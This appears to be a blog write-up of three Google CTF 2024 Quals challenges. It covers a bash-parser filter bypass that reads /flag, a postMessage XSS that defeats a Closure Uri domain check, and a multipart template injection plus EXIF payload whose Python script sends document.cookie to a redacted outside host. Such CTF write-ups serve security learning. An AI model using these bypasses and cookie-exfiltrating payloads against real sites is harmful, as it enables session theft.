+++ 
draft = false
date = 2024-06-24T22:58:45+09:00
title = "Google CTF 2024 Quals Writeup"
description = ""
slug = "google-ctf-2024-quals-writeup"
authors = []
tags = ["CTF", "web", "misc", "English"]
categories = []
externalLink = ""
series = []
+++

## Intro

I played Google CTF 2024 Quals with Cold Fusion members. Here's the writeup for [onlyecho]({{< ref "#onlyecho-misc" >}}), [sappy]({{< ref "#sappy-web" >}}) and [grand prix heaven]({{< ref "#grand-prix-heaven-web" >}}).

## onlyecho (misc)

`onlyecho` challenge accepts shell script from user and tries to parse them with [bash-parser](https://github.com/vorpaljs/bash-parser). If there's any Redirect or Command ast node except `echo`, the challenge will refuse to execute the script. We need to find a way to bypass this restriction and execute arbitrary command.

As the bash-parser module is pretty old (last released Jun 2017), I thought there might be some inconsistency between actual bash syntax and the bash-parser syntax. After few hours of trying and digging [man bash](https://linux.die.net/man/1/bash), I found that {{< h bash >}}echo  ${a[$(ls>2)]}{{< /h >}} array parameter expansion is not handled correctly, resulting in execution of {{< h bash >}}ls>2{{< /h >}} and output to stderr. However, we could not get the error string directly, and reverse shell did not work. To address this limitation, I used {{< h bash >}}echo ${a[0]-`cat /flag`}{{< /h >}} to directly cat flag to stdout.

{{< details "AST of solve script" >}}
```json
{
  "type": "Script",
  "commands": [
    {
      "type": "Command",
      "name": {
        "text": "echo",
        "type": "Word"
      },
      "suffix": [
        {
          "text": "${a[0]-`cat /flag`}",
          "expansion": [
            {
              "loc": {
                "start": 0,
                "end": 18
              },
              "parameter": "a[0]-`cat /flag`",
              "type": "ParameterExpansion"
            }
          ],
          "type": "Word"
        }
      ]
    }
  ]
}
```
{{< /details >}}

## sappy (web)

`sappy` was a simple XSS challenge and all we need was to load arbitrary html by using `render` message handler. `initialize` message handler provided way to change host of API, but it was restricted with domain filter based on googl.Uri.parse function of Google Closure Library. 

```js
function getHost(options) {
  if (!options.host) {
    const u = Uri.parse(document.location);

    return u.scheme + "://sappy-web.2024.ctfcompetition.com";
  }
  return validate(options.host);
}

function validate(host) {
  const h = Uri.parse(host);
  if (h.hasQuery()) {
    throw "invalid host";
  }
  if (h.getDomain() !== "sappy-web.2024.ctfcompetition.com") {
    throw "invalid host";
  }
  return host;
}

function buildUrl(options) {
  return getHost(options) + "/sap/" + options.page;
}
```

To bypass the domain restriction, I digged into the source code of goog.Uri.parse function, and it turns out the function was parsing url with single regex.

```re
/^(?:([^:/?#.]+):)?(?:\/\/(?:([^\\/?#]*)@)?([^\\/?#]*?)(?::([0-9]+))?(?=[\\/?#]|$))?([^?#]+)?(?:\?([^#]*))?(?:#([\s\S]*))?$/
```

The first capture group was scheme, and it allowed all characters except `:/?#.`, which means backslash(`\`) is allowed! We can bypass the domain restriction with following host, getting html content from our server.

`\\[HOST]://sappy-web.2024.ctfcompetition.com`

As the host should not contain dot, we initially used IP decimal convention to represent our server address. But we got no flag from the server. We assumed the problem was that the bot only sets cookie to https origin (somehow by setting Secure flag, idk). To bypass dot restriction, I used `%E3%80%82` (。: IDEOGRAPHIC FULL STOP) instead of dot, and sent request to https server. But there was no flag again. 

It turns out I used iframe to generate window object and pass message to sap frame, but iframe drops cookie if the parent and child's origin is different[^1]. I used `window.open` instead of iframe to bypass this.

```html
<html>
    <body>
        <script>
            const w = window.open('https://sappy-web.2024.ctfcompetition.com/');
            setTimeout(() => {
                w.frames[0].postMessage(`
                {
                    "method": "initialize", 
                    "host": "\\\\\\\\[REDACTED]%E3%80%82hokyun%E3%80%82dev://sappy-web.2024.ctfcompetition.com"
                }`, 'https://sappy-web.2024.ctfcompetition.com/sap.html');

                w.frames[0].postMessage(`
                {
                    "method": "render", 
                    "page": "test"
                }`, 'https://sappy-web.2024.ctfcompetition.com/sap.html');

            }, 2000);
        </script>
    </body>
</html>
```

## grand prix heaven (web)

grand prix heaven contained two server, the first one for handling APIs and second one for just template rendering. As the template engine is separated from webapp, I thought there might be some bug handling template rendering request. Webapp uses `needle` module to send multipart template request to server, and needle incorrectly handled special characters in keys and just pass the string directly. Template engine just splits the body using `\r\n\r\n` and gets template code from each line, so malformed multipart request was fine. We could inject arbitrary template code, including the restricted template `mediaparser`

`mediaparser` template had HTML injection vulnerability by using exif information of image we uploaded, so we crafted special jpeg image with script in it. 

```python
import requests
import json
from PIL import Image
import piexif

# URL = 'http://localhost:1337'
URL = 'https://grandprixheaven-web.2024.ctfcompetition.com'


img = Image.new('RGB', (100, 100), 'red')

exif_ifd = {
    piexif.ExifIFD.UserComment: b'test',
    piexif.ExifIFD.DateTimeOriginal: '2024:01:01 00:00:00',
}

image_ifd = {
    piexif.ImageIFD.ImageDescription: '<img src=x onerror="location.href=\'https://[REDACTED]/\'+btoa(document.cookie)">',
}

exif_bytes = piexif.dump({"0th": image_ifd, "Exif": exif_ifd})
img.save('image.jpg', exif=exif_bytes)

template = {
    '0"\r\n\r\nretrieve\r\n\r\nmediaparser\r\n\r\nhead_end\r\n\r\nfaves\r\n\r\nfooter\r\n\r\n--GP_HEAVEN--GP_HEAVEN--GP_HEAVEN--GP_HEAVEN--GP_HEAVEN--GP_HEAVEN--GP_HEAVEN--GP_HEAVEN\r\n': 'csp'
}

r = requests.post(URL + '/api/new-car', data={
    'year': '2024',
    'make': 'ohk990102',
    'model': 'ohk990102',
    'custom': json.dumps(template)
}, files={
    'image': ('image', open('image.jpg', 'rb'), 'image/jpeg')
}, allow_redirects=False)

config_id = r.headers['Location'].split('F1=')[1]

print(f'{config_id = }')

r = requests.get(URL + '/api/get-car/' + config_id)

img_id = r.json()['img_id']

report_url = URL + '/fave/' + config_id + '?F1=' + "%5Cmedia%5C" + img_id

r = requests.post(URL + '/report', data={
    'url': report_url
})

print(r.text)
```


[^1]: To be more specific, Lax cookies are sent with cross-site requests only if they are top-level requests AND have a safe method. [IETF Spec](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis-07#section-5.5). Lax became default in Chrome on Jul 2020. [Chrome Status](https://chromestatus.com/feature/5088147346030592)
